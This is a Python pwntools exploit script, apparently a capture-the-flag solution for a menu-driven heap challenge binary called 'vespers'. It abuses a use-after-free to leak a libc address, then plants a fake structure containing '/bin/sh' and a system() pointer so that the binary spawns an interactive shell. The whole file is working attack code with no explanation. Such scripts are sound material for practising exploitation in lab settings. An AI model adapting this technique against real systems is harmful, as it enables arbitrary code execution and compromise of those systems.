#!/usr/bin/env python3
from pwn import *

PORT = 5000
HOST = "10.0.182.182"
elf = context.binary = ELF('./vespers_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000013F7
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def menu(choice):
    p.sendlineafter(b"> ", str(choice).encode())


def recruit(name, style, tlen, transcript):
    assert len(transcript) == tlen

    menu(1)
    p.sendlineafter(b"Name this chorister: ", name)
    p.sendlineafter(b"Choose a hymn style", str(style).encode())
    p.sendlineafter(b"Transcript length", str(tlen).encode())
    p.sendafter(b"raw bytes): ", transcript)


def retire(idx):
    menu(2)
    p.sendlineafter(b"Retire which seat? ", str(idx).encode())


def restore(idx):
    menu(3)
    p.sendlineafter(b"Restore which seat? ", str(idx).encode())


def inscribe(idx, data):
    menu(4)
    p.sendlineafter(b"Inscribe which seat? ", str(idx).encode())
    p.sendafter(b"raw bytes to inscribe: ", data)


def recite(idx, size):
    menu(5)
    p.sendlineafter(b"Recite which seat? ", str(idx).encode())
    p.recvuntil(b"bytes):\n")
    data = p.recvn(size)
    p.recvn(1)
    return data


def rename(idx, data):
    assert len(data) == 0x37
    menu(6)
    p.sendlineafter(b"Rename which seat? ", str(idx).encode())
    p.sendafter(b"raw bytes): ", data)

def roster():
    menu(7)

def perform():
    menu(8)

recruit(b"usbin", 0, 0x500, b"A" * 0x500)
recruit(b"guard", 0, 0x20, b"B" * 0x20)

retire(0)
restore(0)

# GDB()
leak_data = recite(0, 0x8)
libc.address = u64(leak_data) - 0x21ace0

log.info(f'libc: {hex(libc.address)}')


fake_chorister = flat(
    b"/bin/sh\x00".ljust(0x38, b'\x00'),
    libc.sym.system,
    0,
    0,
    1,
).ljust(0x58, b"\x00")

recruit(b"fake", 0, 0x58, fake_chorister)

perform()

p.interactive()